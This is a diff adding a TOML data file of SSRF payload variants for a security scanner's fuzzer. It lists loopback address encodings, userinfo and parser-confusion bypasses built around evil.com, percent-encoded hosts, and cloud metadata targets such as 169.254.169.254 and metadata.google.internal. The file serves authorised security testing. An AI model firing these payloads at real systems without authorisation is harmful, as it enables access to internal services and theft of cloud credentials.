@@ -1,0 +1,222 @@
+# SSRF mutation variants (Tier-B data for `grammar::ssrf::mutate`).
+#
+# `mutate` is the BROAD same-class fuzzer used by `scan`'s exploration pass
+# (NOT the sound same-attack equiv engine — that lives in grammar::equiv::ssrf
+# and is data-driven by its own oracle). These entries are the static variant
+# lists that used to be hardcoded in ssrf.rs; they are deliberately
+# *different-target* forms (loopback/metadata/rebinding hosts), legitimate for
+# scan's fire-at-an-operator-chosen-target job.
+#
+# Templates substitute two placeholders at runtime:
+#   {scheme}      — the payload's URL scheme incl. `://` (e.g. `http://`)
+#   {oob_domain}  — the configured out-of-band domain (WAFRIFT_OOB_DOMAIN)
+# `suffixed_address` templates additionally have the payload's path/query
+# appended after substitution.
+#
+# Tier-B contract: drop additional [[address_encoding]] / [[userinfo_bypass]]
+# / [[percent_encoded]] / [[confusion_target]] / [[suffixed_address]] entries
+# to extend coverage without recompiling logic. Order is preserved; the final
+# result set is de-duplicated and sorted by the caller.
+
+# ── Address-encoding forms (host-only, no path) ────────────────────────────
+[[address_encoding]]
+template = "{scheme}2130706433"
+description = "IPv4 as integer"
+
+[[address_encoding]]
+template = "{scheme}0177.0.0.1"
+description = "Octal notation"
+
+[[address_encoding]]
+template = "{scheme}0x7f000001"
+description = "Hexadecimal"
+
+[[address_encoding]]
+template = "{scheme}[::1]"
+description = "IPv6 loopback"
+
+[[address_encoding]]
+template = "{scheme}[::ffff:127.0.0.1]"
+description = "IPv4-mapped IPv6"
+
+[[address_encoding]]
+template = "{scheme}[0:0:0:0:0:ffff:7f00:1]"
+description = "Full IPv4-mapped IPv6"
+
+[[address_encoding]]
+template = "{scheme}[::ffff:7f00:1]"
+description = "Compressed IPv4-mapped"
+
+[[address_encoding]]
+template = "{scheme}[0:0:0:0:0:0:0:1]"
+description = "Full IPv6 loopback"
+
+[[address_encoding]]
+template = "{scheme}127.0.0.1.nip.io"
+description = "DNS rebinding"
+
+[[address_encoding]]
+template = "{scheme}127.0.0.1.xip.io"
+description = "Alternative DNS rebinding"
+
+[[address_encoding]]
+template = "{scheme}spoofed.{oob_domain}"
+description = "OOB domain"
+
+[[address_encoding]]
+template = "{scheme}localhost"
+description = "Localhost name"
+
+[[address_encoding]]
+template = "{scheme}127.1"
+description = "Short form"
+
+[[address_encoding]]
+template = "{scheme}0"
+description = "Zero IP"
+
+[[address_encoding]]
+template = "{scheme}0.0.0.0"
+description = "Any address"
+
+[[address_encoding]]
+template = "{scheme}127.0.0.2"
+description = "Alternative loopback"
+
+[[address_encoding]]
+template = "{scheme}127.127.127.127"
+description = "Pattern loopback"
+
+# ── Redirect / userinfo bypass forms ───────────────────────────────────────
+[[userinfo_bypass]]
+template = "{scheme}evil.com@127.0.0.1"
+description = "Userinfo bypass"
+
+[[userinfo_bypass]]
+template = "{scheme}127.0.0.1%23@evil.com"
+description = "Fragment bypass"
+
+[[userinfo_bypass]]
+template = "{scheme}127.0.0.1%2F@evil.com"
+description = "Path encoding bypass"
+
+[[userinfo_bypass]]
+template = "{scheme}127.0.0.1?@evil.com"
+description = "Query bypass"
+
+[[userinfo_bypass]]
+template = "{scheme}127.0.0.1///@evil.com"
+description = "Multiple slash bypass"
+
+[[userinfo_bypass]]
+template = "{scheme}////127.0.0.1"
+description = "Leading slash bypass"
+
+[[userinfo_bypass]]
+template = "{scheme}127.0.0.1%00.evil.com"
+description = "Null byte bypass"
+
+# ── Percent-encoded host forms ─────────────────────────────────────────────
+[[percent_encoded]]
+template = "{scheme}%31%32%37.%30.%30.%31"
+description = "Double-encoded 127.0.0.1"
+
+[[percent_encoded]]
+template = "{scheme}%37%66%30%30%30%30%30%31"
+description = "Hex 0x7f000001"
+
+[[percent_encoded]]
+template = "{scheme}127%2e0%2e0%2e1"
+description = "Partial encoding"
+
+[[percent_encoded]]
+template = "{scheme}%6C%6F%63%61%6C%68%6F%73%74"
+description = "Encoded 'localhost'"
+
+# ── Parser-confusion authority targets (Orange Tsai 2017 class) ────────────
+# The real SSRF destination placed after the cover host in authority-confusion
+# variants. The transform that combines cover+target is code (it encodes the
+# specific parser disagreements); only the target host list is data.
+[[confusion_target]]
+host = "127.0.0.1"
+description = "Loopback"
+
+[[confusion_target]]
+host = "localhost"
+description = "Loopback name"
+
+[[confusion_target]]
+host = "169.254.169.254"
+description = "AWS / DO / Azure metadata"
+
+[[confusion_target]]
+host = "metadata.google.internal"
+description = "GCP metadata"
+
+[[confusion_target]]
+host = "100.100.100.200"
+description = "Alibaba metadata"
+
+[[confusion_target]]
+host = "0.0.0.0"
+description = "Any address"
+
+# ── Suffixed address forms (path/query appended) ───────────────────────────
+# Fired when the payload carries a path; each template gets the payload's
+# path+query suffix appended after substitution. A curated subset of the
+# address-encoding forms plus extra metadata hosts.
+[[suffixed_address]]
+template = "{scheme}2130706433"
+description = "IPv4 as integer"
+
+[[suffixed_address]]
+template = "{scheme}0177.0.0.1"
+description = "Octal notation"
+
+[[suffixed_address]]
+template = "{scheme}0x7f000001"
+description = "Hexadecimal"
+
+[[suffixed_address]]
+template = "{scheme}[::1]"
+description = "IPv6 loopback"
+
+[[suffixed_address]]
+template = "{scheme}[::ffff:127.0.0.1]"
+description = "IPv4-mapped IPv6"
+
+[[suffixed_address]]
+template = "{scheme}127.0.0.1.nip.io"
+description = "DNS rebinding"
+
+[[suffixed_address]]
+template = "{scheme}spoofed.{oob_domain}"
+description = "OOB domain"
+
+[[suffixed_address]]
+template = "{scheme}169.254.169.254"
+description = "AWS / DO / Azure metadata"
+
+[[suffixed_address]]
+template = "{scheme}metadata.google.internal"
+description = "GCP metadata"
+
+[[suffixed_address]]
+template = "{scheme}metadata.azure"
+description = "Azure metadata shorthand"
+
+[[suffixed_address]]
+template = "{scheme}100.100.100.200"
+description = "Alibaba"
+
+[[suffixed_address]]
+template = "{scheme}168.63.129.16"
+description = "Azure WireServer"
+
+[[suffixed_address]]
+template = "{scheme}172.17.0.1"
+description = "Docker"
+
+[[suffixed_address]]
+template = "{scheme}%31%32%37.%30.%30.%31"
+description = "Double-encoded 127.0.0.1"
